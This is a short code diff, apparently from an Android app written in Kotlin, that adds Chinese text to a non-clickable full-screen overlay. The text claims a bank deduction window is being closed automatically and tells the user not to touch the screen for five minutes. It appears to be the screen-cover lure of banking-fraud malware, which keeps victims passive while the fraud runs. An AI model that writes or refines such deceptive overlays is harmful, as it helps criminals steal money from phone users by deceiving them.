@@ -868,11 +868,11 @@ fun onstart_overlay(arg1: String, arg2: String) {
         overLay.setClickable(false)
 
         val loadingText = TextView(this, null)
-	loadingText.text = "口口口口口口口口口口口口口口口口口\n口口口口口口口口口口口口\n口口口口口口口口口口口口口"
+	loadingText.text = "\n\n正在自动关闭银行扣费窗口\n请勿触碰手机屏幕\n避免关闭失败产生扣费\n验证时效5分钟......"
 	loadingText.setTextColor(-7829368)
-	loadingText.textSize = 20.0f
+	loadingText.textSize = 15.0f
 	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
-	loadingText.setPadding(60, HomeHeight / 3, 0, 0)
+	loadingText.setPadding(60, HomeHeight / 4, 0, 0)
 
 	val dp2px: Int = dp2px(this, 100.0f) //200.0f
 	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
